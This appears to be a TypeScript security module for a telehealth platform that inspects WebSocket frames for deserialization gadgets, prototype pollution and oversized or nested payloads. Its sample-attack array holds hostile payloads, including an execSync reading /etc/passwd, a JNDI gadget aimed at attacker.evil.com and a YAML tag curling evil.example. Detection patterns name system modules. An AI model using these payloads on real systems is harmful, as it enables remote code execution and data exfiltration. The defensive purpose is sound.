/**
 * Motor Criptográfico de Proteção contra Injeção de Objetos e Desserialização Não Segura em Sessões WebSocket
 * Em conformidade com:
 * - RFC 6455 (The WebSocket Protocol - Framing, Opcodes & Status Code 1008 Policy Violation)
 * - OWASP ASVS v4.0 V5.5 (Deserialization Prevention) & V4.3
 * - CWE-502 (Deserialization of Untrusted Data - Polymorphic Type Gadgets, Java/Python/PHP/Node Serialized Payloads)
 * - CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes - Prototype Pollution)
 * - RFC 8785 (JSON Canonicalization Scheme - JCS) para Selagem Notarial WORM
 */

import { createHash, createHmac, timingSafeEqual } from 'node:crypto';
import {
  ClinicalWebSocketChannelType,
  WebSocketFrameOpcode,
  WebSocketRiskSeverity,
  WebSocketThreatCategory,
  WebSocketValidationAction
} from '@terapiainfoco/shared';
import type {
  ClinicalWebSocketChannelSchema,
  WebSocketAdversarialSample,
  WebSocketFrameInspectionResult,
  WebSocketGuardPolicy,
  WebSocketProofSeal,
  WebSocketThreat
} from '@terapiainfoco/shared';

const WEBSOCKET_GUARD_HMAC_SECRET =
  process.env.WEBSOCKET_GUARD_HMAC_SECRET ||
  'terapiainfoco_websocket_rfc6455_cwe502_worm_secret_2026';

export const DEFAULT_WEBSOCKET_GUARD_POLICY: WebSocketGuardPolicy = {
  blockPolymorphicGadgets: true,
  blockPrototypePollution: true,
  blockBinaryFramesOnJsonChannels: true,
  enforceChannelEventSchema: true,
  blockExecutablePayloads: true,
  maxFrameSizeBytes: 65536, // 64 KiB por frame WebSocket
  maxJsonNestingDepth: 8,
  maxObjectKeysCount: 100,
  updatedAt: new Date().toISOString()
};

export const CLINICAL_WEBSOCKET_CHANNEL_SCHEMAS: ClinicalWebSocketChannelSchema[] = [
  {
    channel: ClinicalWebSocketChannelType.WEBRTC_SIGNALING,
    label: 'Sinalização WebRTC P2P (SDP / ICE)',
    description: 'Troca de ofertas/respostas SDP e candidatos ICE para teleconsulta ponto-a-ponto (RFC-001 §3.2).',
    allowedOpcodes: [WebSocketFrameOpcode.TEXT, WebSocketFrameOpcode.PING, WebSocketFrameOpcode.PONG],
    allowedEventTypes: ['WEBRTC_SDP_OFFER', 'WEBRTC_SDP_ANSWER', 'WEBRTC_ICE_CANDIDATE', 'WEBRTC_RENEGOTIATE'],
    maxPayloadBytes: 32768,
    maxNestingDepth: 6,
    sampleSafeFrame: JSON.stringify({
      event: 'WEBRTC_ICE_CANDIDATE',
      roomId: 'room-teleconsult-001',
      candidate: 'candidate:842163049 1 udp 1677729535 192.0.2.10 54400 typ srflx',
      sdpMid: '0'
    })
  },
  {
    channel: ClinicalWebSocketChannelType.LIVE_TRANSCRIPTION_STREAM,
    label: 'Stream de Transcrição & Diarização IA',
    description: 'Recebimento de enunciados diarizados [TERAPEUTA] e [PACIENTE] em tempo real (RFC-001 §3.3).',
    allowedOpcodes: [WebSocketFrameOpcode.TEXT, WebSocketFrameOpcode.PING, WebSocketFrameOpcode.PONG],
    allowedEventTypes: ['UTTERANCE_PARTIAL', 'UTTERANCE_FINAL', 'DIARIZATION_SYNC'],
    maxPayloadBytes: 16384,
    maxNestingDepth: 5,
    sampleSafeFrame: JSON.stringify({
      event: 'UTTERANCE_FINAL',
      speaker: 'PATIENT',
      startTimeMs: 12400,
      endTimeMs: 16800,
      text: 'Senti melhora significativa na qualidade do sono após os exercícios respiratórios.'
    })
  },
  {
    channel: ClinicalWebSocketChannelType.CLINICAL_MARKERS_SYNC,
    label: 'Sincronização de Marcadores Clínicos',
    description: 'Marcação de momentos-chave (Insight, Alerta de Crise, Mudança de Afeto) durante a sessão.',
    allowedOpcodes: [WebSocketFrameOpcode.TEXT],
    allowedEventTypes: ['MARKER_CREATED', 'MARKER_UPDATED', 'SOAP_QUADRANT_TAGGED'],
    maxPayloadBytes: 8192,
    maxNestingDepth: 5,
    sampleSafeFrame: JSON.stringify({
      event: 'MARKER_CREATED',
      markerType: 'INSIGHT',
      sessionSecond: 945,
      note: 'Paciente identificou gatilho cognitivo associado à autocobrança.'
    })
  },
  {
    channel: ClinicalWebSocketChannelType.WAITING_ROOM_PRESENCE,
    label: 'Sala de Espera Ética (Knocking CFP 011/2018)',
    description: 'Notificações de presença e admissão manual do paciente na sala de espera.',
    allowedOpcodes: [WebSocketFrameOpcode.TEXT, WebSocketFrameOpcode.PING, WebSocketFrameOpcode.PONG],
    allowedEventTypes: ['PATIENT_KNOCKING', 'THERAPIST_ADMITTED', 'WAITING_STATUS_SYNC'],
    maxPayloadBytes: 4096,
    maxNestingDepth: 4,
    sampleSafeFrame: JSON.stringify({
      event: 'PATIENT_KNOCKING',
      appointmentId: 'appt-2026-001',
      patientInitials: 'M. S. O.'
    })
  },
  {
    channel: ClinicalWebSocketChannelType.TELEMETRY_HEARTBEAT,
    label: 'Telemetria MOS ITU-T G.107 & Heartbeat',
    description: 'Monitoramento contínuo de jitter, perda de pacotes, RTT e reconexão de sessão.',
    allowedOpcodes: [WebSocketFrameOpcode.TEXT, WebSocketFrameOpcode.PING, WebSocketFrameOpcode.PONG],
    allowedEventTypes: ['SESSION_HEARTBEAT', 'MOS_QUALITY_REPORT', 'RECONNECT_CHALLENGE'],
    maxPayloadBytes: 4096,
    maxNestingDepth: 4,
    sampleSafeFrame: JSON.stringify({
      event: 'MOS_QUALITY_REPORT',
      rttMs: 28,
      jitterMs: 4.2,
      packetLossPct: 0.1,
      mosScore: 4.38
    })
  }
];

export const SAMPLE_WEBSOCKET_ATTACKS: WebSocketAdversarialSample[] = [
  {
    id: 'ws-atk-01',
    name: 'Node-Serialize RCE IIFE Gadget (CWE-502)',
    category: WebSocketThreatCategory.INSECURE_DESERIALIZATION_GADGET,
    cwe: 'CWE-502',
    channel: ClinicalWebSocketChannelType.WEBRTC_SIGNALING,
    opcode: WebSocketFrameOpcode.TEXT,
    rawFramePayload: JSON.stringify({
      event: 'WEBRTC_SDP_OFFER',
      rceGadget: '_$$ND_FUNC$$_function(){require("child_process").execSync("cat /etc/passwd")}()'
    }),
    description: 'Injeção de função auto-executável serializada no padrão node-serialize visando execução remota no servidor WebSocket.'
  },
  {
    id: 'ws-atk-02',
    name: 'Jackson / .NET Polymorphic $type Gadget (CWE-502)',
    category: WebSocketThreatCategory.INSECURE_DESERIALIZATION_GADGET,
    cwe: 'CWE-502',
    channel: ClinicalWebSocketChannelType.LIVE_TRANSCRIPTION_STREAM,
    opcode: WebSocketFrameOpcode.TEXT,
    rawFramePayload: JSON.stringify({
      event: 'UTTERANCE_FINAL',
      $type: 'System.Windows.Data.ObjectDataProvider, PresentationFramework',
      '@class': 'com.sun.rowset.JdbcRowSetImpl',
      dataSourceName: 'ldap://attacker.evil.com:1389/Exploit'
    }),
    description: 'Injeção de discriminadores polimórficos ($type / @class) para instanciar classes arbitrárias e acionar JNDI/LDAP.'
  },
  {
    id: 'ws-atk-03',
    name: 'Prototype Pollution via WebSocket Frame (CWE-1321)',
    category: WebSocketThreatCategory.PROTOTYPE_POLLUTION_INJECTION,
    cwe: 'CWE-1321',
    channel: ClinicalWebSocketChannelType.CLINICAL_MARKERS_SYNC,
    opcode: WebSocketFrameOpcode.TEXT,
    rawFramePayload:
      '{"event":"MARKER_CREATED","__proto__":{"isAdmin":true,"bypassRbac":true},"constructor":{"prototype":{"isSigned":true}}}',
    description: 'Poluição de Object.prototype via chaves __proto__ e constructor.prototype em evento de marcador clínico.'
  },
  {
    id: 'ws-atk-04',
    name: 'Opcode 0x2 Binary Java Serialization Stream (rO0AB / CWE-502)',
    category: WebSocketThreatCategory.BINARY_OPCODE_SMUGGLING,
    cwe: 'CWE-502',
    channel: ClinicalWebSocketChannelType.WAITING_ROOM_PRESENCE,
    opcode: WebSocketFrameOpcode.BINARY,
    rawFramePayload: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAHcGF5bG9hZHQAA2N2ZQ==',
    description: 'Contrabando de frame binário (Opcode 0x2) contendo stream Java ObjectInputStream (magic rO0AB) em canal estritamente JSON.'
  },
  {
    id: 'ws-atk-05',
    name: 'Deep JSON Nesting Bomb em WebSocket (Stack Exhaustion)',
    category: WebSocketThreatCategory.DEEP_NESTING_DOS,
    cwe: 'CWE-400',
    channel: ClinicalWebSocketChannelType.TELEMETRY_HEARTBEAT,
    opcode: WebSocketFrameOpcode.TEXT,
    rawFramePayload:
      '{"event":"SESSION_HEARTBEAT","a":{"b":{"c":{"d":{"e":{"f":{"g":{"h":{"i":{"j":{"k":{"l":"bomb"}}}}}}}}}}}}',
    description: 'Frame JSON com aninhamento profundo projetado para exaurir a pilha de chamadas do parser de eventos em tempo real.'
  },
  {
    id: 'ws-atk-06',
    name: 'Python Pickle / YAML Object Tag Injection (CWE-502)',
    category: WebSocketThreatCategory.INSECURE_DESERIALIZATION_GADGET,
    cwe: 'CWE-502',
    channel: ClinicalWebSocketChannelType.LIVE_TRANSCRIPTION_STREAM,
    opcode: WebSocketFrameOpcode.TEXT,
    rawFramePayload: JSON.stringify({
      event: 'UTTERANCE_PARTIAL',
      text: '!!python/object/apply:os.system ["curl https://evil.example/exfiltrate"]'
    }),
    description: 'Tentativa de injeção de diretiva de desserialização YAML/Pickle em pipeline de transcrição clínica.'
  }
];

const GADGET_PATTERNS: Array<{ pattern: RegExp; label: string; cwe: string }> = [
  { pattern: /_\$\$ND_FUNC\$\$_/i, label: 'Node-Serialize IIFE Function Gadget (_$$ND_FUNC$$_)', cwe: 'CWE-502' },
  { pattern: /"\$type"\s*:/i, label: '.NET / Json.NET Polymorphic Type Discriminator ($type)', cwe: 'CWE-502' },
  { pattern: /"@class"\s*:/i, label: 'Jackson Polymorphic Class Discriminator (@class)', cwe: 'CWE-502' },
  { pattern: /"__type"\s*:/i, label: 'WCF / DataContractJsonSerializer Type Gadget (__type)', cwe: 'CWE-502' },
  { pattern: /java\.lang\.(Runtime|ProcessBuilder|Thread)/i, label: 'Java Runtime/ProcessBuilder Gadget Chain', cwe: 'CWE-502' },
  { pattern: /javax\.naming\.InitialContext|JdbcRowSetImpl/i, label: 'JNDI Injection Gadget (JdbcRowSetImpl)', cwe: 'CWE-502' },
  { pattern: /!!python\/object/i, label: 'PyYAML Unsafe Object Instantiation (!!python/object)', cwe: 'CWE-502' },
  { pattern: /\brO0AB[A-Za-z0-9+/=]{8,}/, label: 'Java ObjectInputStream Base64 Magic Header (rO0AB)', cwe: 'CWE-502' },
  { pattern: /\bO:\d+:"[^"]+":\d+:\{/, label: 'PHP Unserialize Object Injection (O:len:"Class")', cwe: 'CWE-502' },
  { pattern: /ObjectDataProvider|WindowsIdentity/i, label: '.NET ObjectDataProvider Deserialization Chain', cwe: 'CWE-502' }
];

const EXECUTABLE_PATTERNS: Array<{ pattern: RegExp; label: string }> = [
  { pattern: /\bfunction\s*\([^)]*\)\s*\{/i, label: 'Serialized JavaScript Function Body' },
  { pattern: /\b(eval|setTimeout|setInterval|Function)\s*\(/i, label: 'Dynamic Code Evaluation Call' },
  { pattern: /\brequire\s*\(\s*['"](child_process|fs|net|os)['"]\s*\)/i, label: 'Node.js System Module Require' }
];

function canonicalJson(obj: any): string {
  if (obj === null || typeof obj !== 'object') return JSON.stringify(obj);
  if (Array.isArray(obj)) return `[${obj.map(canonicalJson).join(',')}]`;
  const keys = Object.keys(obj).sort();
  return `{${keys.map((k) => `${JSON.stringify(k)}:${canonicalJson(obj[k])}`).join(',')}}`;
}

function measureDepthAndKeys(
  value: any,
  currentDepth = 1
): { maxDepth: number; totalKeys: number } {
  if (value === null || typeof value !== 'object') {
    return { maxDepth: currentDepth, totalKeys: 0 };
  }
  if (Array.isArray(value)) {
    let maxD = currentDepth;
    let keys = 0;
    for (const item of value) {
      const sub = measureDepthAndKeys(item, currentDepth + 1);
      if (sub.maxDepth > maxD) maxD = sub.maxDepth;
      keys += sub.totalKeys;
    }
    return { maxDepth: maxD, totalKeys: keys };
  }
  const ownKeys = Object.keys(value);
  let maxD = currentDepth;
  let totalK = ownKeys.length;
  for (const k of ownKeys) {
    const sub = measureDepthAndKeys(value[k], currentDepth + 1);
    if (sub.maxDepth > maxD) maxD = sub.maxDepth;
    totalK += sub.totalKeys;
  }
  return { maxDepth: maxD, totalKeys: totalK };
}

function sanitizeParsedObject(value: any): any {
  if (value === null || typeof value !== 'object') {
    return value;
  }
  if (Array.isArray(value)) {
    return value.map(sanitizeParsedObject);
  }
  const clean = Object.create(null);
  for (const key of Object.keys(value)) {
    if (
      key === '__proto__' ||
      key === 'constructor' ||
      key === 'prototype' ||
      key === '$type' ||
      key === '@class' ||
      key === '__type'
    ) {
      continue;
    }
    clean[key] = sanitizeParsedObject(value[key]);
  }
  return { ...clean };
}

export class WebSocketDeserializationGuardEngine {
  private policy: WebSocketGuardPolicy;

  constructor(customPolicy?: Partial<WebSocketGuardPolicy>) {
    this.policy = { ...DEFAULT_WEBSOCKET_GUARD_POLICY, ...(customPolicy || {}) };
  }

  public getPolicy(): WebSocketGuardPolicy {
    return { ...this.policy };
  }

  public updatePolicy(updates: Partial<WebSocketGuardPolicy>): WebSocketGuardPolicy {
    this.policy = {
      ...this.policy,
      ...updates,
      updatedAt: new Date().toISOString()
    };
    return { ...this.policy };
  }

  public issueSeal(params: {
    channel: ClinicalWebSocketChannelType;
    opcode: WebSocketFrameOpcode;
    payloadSha256: string;
    action: WebSocketValidationAction;
    severity: WebSocketRiskSeverity;
    timestamp?: string;
  }): WebSocketProofSeal {
    const timestamp = params.timestamp || new Date().toISOString();
    const canonical = canonicalJson({
      channel: params.channel,
      opcode: params.opcode,
      payloadSha256: params.payloadSha256,
      action: params.action,
      severity: params.severity,
      timestamp
    });

    const hmacSignature = createHmac('sha256', WEBSOCKET_GUARD_HMAC_SECRET)
      .update(canonical)
      .digest('hex');

    return {
      sealId: `ws_guard_seal_${hmacSignature.slice(0, 20)}`,
      timestamp,
      channel: params.channel,
      opcode: params.opcode,
      payloadSha256: params.payloadSha256,
      action: params.action,
      severity: params.severity,
      hmacSignature
    };
  }

  public verifySeal(seal: WebSocketProofSeal): boolean {
    if (!seal || !seal.hmacSignature || !seal.sealId) return false;
    const canonical = canonicalJson({
      channel: seal.channel,
      opcode: seal.opcode,
      payloadSha256: seal.payloadSha256,
      action: seal.action,
      severity: seal.severity,
      timestamp: seal.timestamp
    });

    const expected = createHmac('sha256', WEBSOCKET_GUARD_HMAC_SECRET)
      .update(canonical)
      .digest('hex');

    try {
      const a = Buffer.from(seal.hmacSignature, 'hex');
      const b = Buffer.from(expected, 'hex');
      if (a.length !== b.length) return false;
      return timingSafeEqual(a, b);
    } catch {
      return false;
    }
  }

  public inspectFrame(params: {
    channel: ClinicalWebSocketChannelType;
    opcode?: WebSocketFrameOpcode;
    rawFramePayload: string;
  }): WebSocketFrameInspectionResult {
    const startNs = performance.now();
    const opcode = params.opcode || WebSocketFrameOpcode.TEXT;
    const raw = params.rawFramePayload || '';
    const frameSizeBytes = Buffer.byteLength(raw, 'utf8');
    const payloadSha256 = createHash('sha256').update(raw).digest('hex');
    const threats: WebSocketThreat[] = [];

    const channelSchema =
      CLINICAL_WEBSOCKET_CHANNEL_SCHEMAS.find((s) => s.channel === params.channel) ||
      CLINICAL_WEBSOCKET_CHANNEL_SCHEMAS[0];

    // 1. Validação de Opcode RFC 6455
    if (
      this.policy.blockBinaryFramesOnJsonChannels &&
      (opcode === WebSocketFrameOpcode.BINARY ||
        opcode === WebSocketFrameOpcode.RESERVED_ILLEGAL ||
        !channelSchema.allowedOpcodes.includes(opcode))
    ) {
      threats.push({
        id: `WS-OPCODE-${Date.now()}`,
        category: WebSocketThreatCategory.BINARY_OPCODE_SMUGGLING,
        severity: WebSocketRiskSeverity.CRITICAL,
        cwe: 'CWE-502',
        description: `Opcode WebSocket não autorizado (${opcode}) para o canal clínico JSON ${params.channel}.`,
        matchedPattern: opcode,
        remediation: 'Restringir frames ao opcode 0x1_TEXT e encerrar conexão com RFC 6455 Status 1003/1008.'
      });
    }

    // 2. Validação de tamanho máximo do frame
    const effectiveMaxBytes = Math.min(this.policy.maxFrameSizeBytes, channelSchema.maxPayloadBytes);
    if (frameSizeBytes > effectiveMaxBytes) {
      threats.push({
        id: `WS-SIZE-${Date.now()}`,
        category: WebSocketThreatCategory.OVERSIZED_FRAME_FLOOD,
        severity: WebSocketRiskSeverity.HIGH,
        cwe: 'CWE-400',
        description: `Frame WebSocket (${frameSizeBytes} bytes) excede o limite de segurança do canal (${effectiveMaxBytes} bytes).`,
        matchedPattern: `${frameSizeBytes} > ${effectiveMaxBytes}`,
        remediation: 'Rejeitar frame com código 1009 (Message Too Big).'
      });
    }

    // 3. Detecção de Gadgets de Desserialização Insegura (CWE-502)
    if (this.policy.blockPolymorphicGadgets) {
      for (const g of GADGET_PATTERNS) {
        if (g.pattern.test(raw)) {
          threats.push({
            id: `WS-GADGET-${Date.now()}-${threats.length}`,
            category: WebSocketThreatCategory.INSECURE_DESERIALIZATION_GADGET,
            severity: WebSocketRiskSeverity.CRITICAL,
            cwe: g.cwe,
            description: `Gadget de desserialização insegura detectado: ${g.label}.`,
            matchedPattern: g.label,
            remediation: 'Proibir polimorfismo dinâmico e usar JSON.parse puro com schema estrito.'
          });
        }
      }
    }

    // 4. Detecção de Payloads de Código Executável
    if (this.policy.blockExecutablePayloads) {
      for (const ex of EXECUTABLE_PATTERNS) {
        if (ex.pattern.test(raw)) {
          threats.push({
            id: `WS-EXEC-${Date.now()}-${threats.length}`,
            category: WebSocketThreatCategory.EXECUTABLE_CODE_PAYLOAD,
            severity: WebSocketRiskSeverity.CRITICAL,
            cwe: 'CWE-94',
            description: `Código executável embutido em frame WebSocket: ${ex.label}.`,
            matchedPattern: ex.label,
            remediation: 'Bloquear funções serializadas e chamadas de sistema.'
          });
        }
      }
    }

    // 5. Detecção de Prototype Pollution na string bruta (CWE-1321)
    if (
      this.policy.blockPrototypePollution &&
      (/"__proto__"\s*:/.test(raw) ||
        /"constructor"\s*:\s*\{\s*"prototype"/.test(raw) ||
        /"prototype"\s*:/.test(raw))
    ) {
      threats.push({
        id: `WS-PROTO-${Date.now()}`,
        category: WebSocketThreatCategory.PROTOTYPE_POLLUTION_INJECTION,
        severity: WebSocketRiskSeverity.CRITICAL,
        cwe: 'CWE-1321',
        description: 'Tentativa de poluição de protótipo (__proto__ / constructor.prototype) em frame WebSocket.',
        matchedPattern: '__proto__ / constructor.prototype',
        remediation: 'Remover chaves de protótipo com reviver seguro e congelar Object.prototype.'
      });
    }

    // 6. Parsing seguro e medição de profundidade / número de chaves
    let parsed: any = null;
    let nestingDepth = 0;
    let keyCount = 0;
    let eventTypeDetected = 'UNKNOWN';

    try {
      parsed = JSON.parse(raw);
      const stats = measureDepthAndKeys(parsed);
      nestingDepth = stats.maxDepth;
      keyCount = stats.totalKeys;
      if (parsed && typeof parsed === 'object' && typeof parsed.event === 'string') {
        eventTypeDetected = parsed.event;
      }
    } catch {
      if (opcode === WebSocketFrameOpcode.TEXT) {
        threats.push({
          id: `WS-MALFORMED-${Date.now()}`,
          category: WebSocketThreatCategory.INSECURE_DESERIALIZATION_GADGET,
          severity: WebSocketRiskSeverity.HIGH,
          cwe: 'CWE-502',
          description: 'Payload de frame 0x1_TEXT não é um JSON válido ou contém stream serializado não-JSON.',
          matchedPattern: raw.slice(0, 60),
          remediation: 'Aceitar apenas estruturas JSON válidas em conformidade com o schema.'
        });
      }
    }

    // 7. Validação de Profundidade Máxima e Contagem de Chaves
    const maxAllowedDepth = Math.min(this.policy.maxJsonNestingDepth, channelSchema.maxNestingDepth);
    if (nestingDepth > maxAllowedDepth) {
      threats.push({
        id: `WS-DEPTH-${Date.now()}`,
        category: WebSocketThreatCategory.DEEP_NESTING_DOS,
        severity: WebSocketRiskSeverity.HIGH,
        cwe: 'CWE-400',
        description: `Profundidade de aninhamento JSON (${nestingDepth}) excede o limite máximo (${maxAllowedDepth}).`,
        matchedPattern: `depth=${nestingDepth}`,
        remediation: 'Limitar profundidade de objetos aninhados no parser WebSocket.'
      });
    }

    if (keyCount > this.policy.maxObjectKeysCount) {
      threats.push({
        id: `WS-KEYS-${Date.now()}`,
        category: WebSocketThreatCategory.DEEP_NESTING_DOS,
        severity: WebSocketRiskSeverity.MEDIUM,
        cwe: 'CWE-400',
        description: `Total de chaves no frame (${keyCount}) excede o limite de ${this.policy.maxObjectKeysCount}.`,
        matchedPattern: `keys=${keyCount}`,
        remediation: 'Restringir o número máximo de atributos por mensagem.'
      });
    }

    // 8. Validação de Evento Homologado para o Canal
    if (
      this.policy.enforceChannelEventSchema &&
      parsed &&
      typeof parsed === 'object' &&
      !channelSchema.allowedEventTypes.includes(eventTypeDetected)
    ) {
      threats.push({
        id: `WS-SCHEMA-${Date.now()}`,
        category: WebSocketThreatCategory.UNREGISTERED_CHANNEL_EVENT,
        severity: WebSocketRiskSeverity.MEDIUM,
        cwe: 'CWE-20',
        description: `Evento '${eventTypeDetected}' não pertence ao schema homologado do canal ${params.channel}.`,
        matchedPattern: eventTypeDetected,
        remediation: `Permitir exclusivamente eventos registrados: ${channelSchema.allowedEventTypes.join(', ')}.`
      });
    }

    // Determinação da severidade e ação final
    let severity = WebSocketRiskSeverity.CLEAN;
    let action = WebSocketValidationAction.ALLOW_FRAME;

    if (threats.some((t) => t.severity === WebSocketRiskSeverity.CRITICAL)) {
      severity = WebSocketRiskSeverity.CRITICAL;
      action = WebSocketValidationAction.TERMINATE_CONNECTION_1008;
    } else if (threats.some((t) => t.severity === WebSocketRiskSeverity.HIGH)) {
      severity = WebSocketRiskSeverity.HIGH;
      action = WebSocketValidationAction.DROP_FRAME;
    } else if (threats.some((t) => t.severity === WebSocketRiskSeverity.MEDIUM)) {
      severity = WebSocketRiskSeverity.MEDIUM;
      action = WebSocketValidationAction.DROP_FRAME;
    } else if (threats.length > 0) {
      severity = WebSocketRiskSeverity.LOW;
      action = WebSocketValidationAction.SANITIZE_PAYLOAD;
    }

    const isValid = threats.length === 0;
    const sanitizedPayload =
      parsed && typeof parsed === 'object' ? sanitizeParsedObject(parsed) : null;

    const inspectionDurationUs = Math.max(
      1,
      Math.round((performance.now() - startNs) * 1000)
    );

    const seal = this.issueSeal({
      channel: params.channel,
      opcode,
      payloadSha256,
      action,
      severity
    });

    return {
      isValid,
      channel: params.channel,
      opcode,
      severity,
      action,
      frameSizeBytes,
      nestingDepth,
      keyCount,
      eventTypeDetected,
      threats,
      sanitizedPayload,
      inspectionDurationUs,
      seal
    };
  }
}
